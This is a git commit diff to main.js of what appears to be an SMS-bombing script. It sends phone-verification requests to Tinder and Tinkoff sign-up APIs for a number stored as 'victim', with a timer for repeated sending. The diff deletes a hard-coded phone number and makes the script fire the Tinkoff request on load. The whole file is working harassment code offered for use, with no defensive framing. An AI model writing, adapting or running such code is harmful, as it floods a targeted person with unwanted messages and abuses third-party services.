e446e74e0c5995e99550432c983a90414ed313c4
UnRise <49236186+UnRise@users.noreply.github.com>
2019-11-16 20:26:08 +0700

    Update main.js

--- main.js
+++ main.js
@@ -2,31 +2,31 @@
 const fetch = require('node-fetch')
 const FormData = require('form-data')
 //consts
-const victim = '9930141902'
+const victim = ''
 const delay = 5000
 const disable = 10000
 
 //services 
-function b_tinder(Numb){
- const payload = {
-  'phone': Numb
-  }
-  fetch('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', {
-  method: 'post',
-  headers: {
-    'Content-Type': 'application/json'
-  },
-  body: JSON.stringify(payload),
-  mode: 'no-cors'
-})
-  .then(r => r.status)
-  .then(r => console.log('Tinder: '+r))
-  .catch(e => console.log(e))
-}
+// function b_tinder(Numb){
+//  const payload = {
+//   'phone': Numb
+//   }
+//   fetch('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', {
+//   method: 'post',
+//   headers: {
+//     'Content-Type': 'application/json'
+//   },
+//   body: JSON.stringify(payload),
+//   mode: 'no-cors'
+// })
+//   .then(r => r.status)
+//   .then(r => console.log('Tinder: '+r))
+//   .catch(e => console.log(e))
+// }
 
-function b_tinkoff(Numb){
+function b_tinkoff(){
   const payload = new FormData()
-  payload.append('phone', Numb)
+  payload.append('phone', victim)
   fetch('https://api.tinkoff.ru/v1/sign_up', {
     method: 'post',
     body: payload
@@ -36,11 +36,13 @@ function b_tinkoff(Numb){
     .catch(e => console.log(e))
 }
 //load
-this.attack = function (Numb){
-  b_tinder(Numb)
-  b_tinkoff(Numb)
+this.attack = function (){
+  // b_tinder(Numb)
+  b_tinkoff()
 }
 
 //press F
 //  let timer = setInterval(attack, delay, victim)
 // setTimeout(() => {clearInterval(timer)}, disable)
+
+b_tinkoff()
